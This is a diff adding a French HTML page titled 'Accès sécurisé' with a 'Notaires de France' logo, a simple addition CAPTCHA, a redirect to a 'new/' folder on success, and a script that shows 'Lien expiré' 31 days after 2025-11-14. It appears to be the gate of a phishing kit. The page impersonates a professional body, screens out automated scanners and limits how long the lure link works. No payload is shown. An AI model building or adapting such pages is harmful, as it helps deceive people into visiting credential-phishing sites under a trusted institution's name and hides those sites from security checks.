@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Accès sécurisé</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f6f9;
+      color: #333;
+      padding: 20px;
+    }
+
+    .captcha-container {
+      max-width: 400px;
+      margin: auto;
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      padding: 30px;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .logo {
+      max-width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #004080;
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    canvas {
+      display: block;
+      margin: 10px auto 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .submit-btn,
+    .reload-btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-top: 5px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .submit-btn {
+      background-color: #004080;
+      color: #fff;
+    }
+
+    .submit-btn:hover {
+      background-color: #003366;
+    }
+
+    .reload-btn {
+      background-color: #eaeaea;
+      color: #333;
+    }
+
+    .reload-btn:hover {
+      background-color: #ddd;
+    }
+
+    .error-message,
+    .success-message {
+      margin-top: 15px;
+      font-weight: bold;
+      display: none;
+    }
+
+    .error-message {
+      color: #e74c3c;
+    }
+
+    .success-message {
+      color: #27ae60;
+    }
+
+    @media (max-width: 480px) {
+      .captcha-container {
+        padding: 20px;
+      }
+
+      input[type="number"],
+      .submit-btn,
+      .reload-btn {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="captcha-container">
+    <img src="new/files/img/logo.svg" alt="Logo Notaires de France" class="logo">
+    <h2>Accès sécurisé</h2>
+    <canvas id="captcha-canvas" width="250" height="60"></canvas>
+    
+    <input type="number" id="captcha-answer" placeholder="Votre réponse" />
+    
+    <button class="submit-btn" onclick="validateCaptcha()">Valider</button>
+    <button class="reload-btn" onclick="generateCaptcha()">Changer de CAPTCHA</button>
+
+    <div class="error-message" id="error-message">❌ Réponse incorrecte. Veuillez réessayer.</div>
+    <div class="success-message" id="success-message">✅ CAPTCHA résolu. Redirection en cours...</div>
+  </div>
+
+  <script>
+    let num1, num2, correctAnswer;
+
+    function generateCaptcha() {
+      num1 = Math.floor(Math.random() * 10) + 1;
+      num2 = Math.floor(Math.random() * 10) + 1;
+      correctAnswer = num1 + num2;
+
+      const canvas = document.getElementById('captcha-canvas');
+      const ctx = canvas.getContext('2d');
+
+      // Nettoyage
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Fond
+      ctx.fillStyle = '#fff';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      // Texte CAPTCHA
+      ctx.font = '22px Georgia';
+      ctx.fillStyle = '#004080';
+      ctx.fillText(`Combien font ${num1} + ${num2} ?`, 10, 35);
+
+      // Réinitialiser les champs
+      document.getElementById('captcha-answer').value = '';
+      document.getElementById('error-message').style.display = 'none';
+      document.getElementById('success-message').style.display = 'none';
+    }
+
+    function validateCaptcha() {
+      const userAnswer = parseInt(document.getElementById('captcha-answer').value, 10);
+      if (userAnswer === correctAnswer) {
+        document.getElementById('error-message').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+
+        setTimeout(() => {
+          localStorage.setItem("valide", "true");
+          window.location.href = 'new/';
+        }, 1500);
+      } else {
+        document.getElementById('error-message').style.display = 'block';
+        document.getElementById('success-message').style.display = 'none';
+        generateCaptcha();
+      }
+    }
+
+    // Vérification expiration lien
+    const startDate = new Date('2025-11-14T00:00:00');
+    const expirationDays = 31;
+
+    function isLinkExpired() {
+      const now = new Date();
+      const diff = now - startDate;
+      const daysPassed = diff / (1000 * 60 * 60 * 24);
+      return daysPassed >= expirationDays;
+    }
+
+    function showExpirationMessage() {
+      if (isLinkExpired()) {
+        document.body.innerHTML = '';
+        const msg = document.createElement('div');
+        msg.innerHTML = `
+          <h1>⚠️ Lien expiré</h1>
+          <p>Ce lien n’est plus valide. Veuillez contacter l’administrateur.</p>
+        `;
+        Object.assign(msg.style, {
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'center',
+          alignItems: 'center',
+          height: '100vh',
+          backgroundColor: '#1a1a1a',
+          color: '#ff4d4f',
+          fontFamily: 'Segoe UI, sans-serif',
+          fontSize: '20px',
+          textAlign: 'center',
+          padding: '40px',
+        });
+        msg.querySelector('h1').style.fontSize = '32px';
+        msg.querySelector('h1').style.marginBottom = '20px';
+        document.body.appendChild(msg);
+      }
+    }
+
+    window.onload = function () {
+      showExpirationMessage();
+      generateCaptcha();
+    };
+  </script>
+</body>
+</html>
